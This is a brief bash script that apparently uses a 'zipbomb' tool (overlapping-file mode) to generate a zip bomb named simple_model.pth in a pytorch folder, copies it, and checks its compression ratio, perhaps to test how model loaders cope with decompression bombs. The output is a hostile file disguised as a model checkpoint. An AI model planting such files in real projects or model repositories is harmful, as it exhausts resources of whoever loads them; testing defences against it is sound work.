#!/bin/bash
TARGET="../../pytorch/simple_model.pth"
TARGET2="../uncompress/simple_model.pth"
python3 ../../zipbomb --mode=quoted_overlap --template=template.zip --num-files=3 --compressed-size=$((16*1)) > "${TARGET}"
cp "${TARGET}" "${TARGET2}"
ls -lhrt ${TARGET}
../../ratio ${TARGET}
